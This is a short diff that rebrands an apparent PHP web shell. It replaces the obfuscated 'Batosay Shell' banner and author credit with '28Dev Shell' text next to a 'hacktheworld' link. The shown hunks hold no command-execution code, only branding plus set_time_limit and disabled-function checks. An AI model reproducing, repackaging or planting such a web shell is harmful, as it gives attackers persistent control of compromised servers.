@@ -114,7 +114,7 @@ option {
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="5">BA'.'TO'.'SAY'.' Sh'.'el'.'l</font></center>
+echo '<font face="Bungee" size="5">28Dev Shell</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
 set_time_limit(0);
@@ -160,7 +160,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>Ba"."to"."say - 2"."02"."3<br><a href='https://www.hacktheworld.com' target='_blank'>28Dev</a></center>";
+	echo "<center><br>28Dev<br><a href='https://www.hacktheworld.com' target='_blank'>hello world</a></center>";
 	exit();
 }
 
